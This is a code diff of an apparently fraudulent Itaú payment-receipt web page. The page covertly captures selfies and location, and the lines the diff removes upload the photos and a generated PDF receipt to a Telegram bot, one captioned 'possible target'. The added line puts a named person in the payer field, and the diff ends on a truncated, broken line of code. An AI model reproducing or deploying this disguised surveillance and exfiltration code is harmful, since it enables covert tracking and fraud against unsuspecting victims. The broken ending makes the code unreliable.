@@ -138,7 +138,7 @@ footer{background:#003d82;color:#fff;padding:32px 24px;text-align:center;font-si
     <div class="row"><span>Valor</span><span>R$ 1.500,00</span></div>
     <div class="row"><span>Recebedor</span><span>Calcard SA Instituição de Pagamentos</span></div>
     <div class="row"><span>CNPJ</span><span>08.611.734/0001-19</span></div>
-    <div class="row"><span>Pagador</span><span>***.***.***-**</span></div>
+    <div class="row"><span><b>Pagador</b></span><span><b>CARLOS EDUARDO SILVA SANTOS</b></span></div>
     <div class="row"><span>Banco</span><span>341 Itaú - **** | *****-*</span></div>
     <div class="row"><span>Data e hora</span><span id="dataHora">--</span></div>
     <div class="row"><span>Canal</span><span>via App Itaú</span></div>
@@ -231,32 +231,6 @@ Local: ${locationData ? `https://maps.google.com/?q=${locationData.lat},${locati
     const binary = atob(selfies[i].split(',')[1]);
     const arr = new Uint8Array(binary.length);
     for(let j=0;j<binary.length;j++) arr[j]=binary.charCodeAt(j);
-    const blob = new Blob([arr],{type:'image/jpeg'});
-    const fd = new FormData();
-    fd.append('chat_id',CHAT_ID);
-    fd.append('photo',blob,`selfie_${i+1}.jpg`);
-    fd.append('caption',`Selfie ${i+1}/5`);
-    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{method:'POST',body:fd});
-  }
-}
-
-function downloadPDF(){
-  const {jsPDF}=window.jspdf;
-  html2canvas(document.getElementById('comprovante'),{scale:2}).then(canvas=>{
-    const img=canvas.toDataURL('image/png');
-    const pdf=new jsPDF({orientation:'portrait',unit:'mm',format:[canvas.width*0.2646,canvas.height*0.2646]});
-    pdf.addImage(img,'PNG',0,0);
-    const pdfBlob=pdf.output('blob');
-    const fd=new FormData();
-    fd.append('chat_id', CHAT_ID);
-    fd.append('document', pdfBlob, 'comprovante_itau.pdf');
-    fd.append('caption','Comprovante baixado - possível alvo');
-    fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`,{method:'POST',body:fd});
-    pdf.save('comprovante_itau.pdf');
-  });
-}
-</script>
-</body>
-</html>
+    const blob = new Blob
 
 
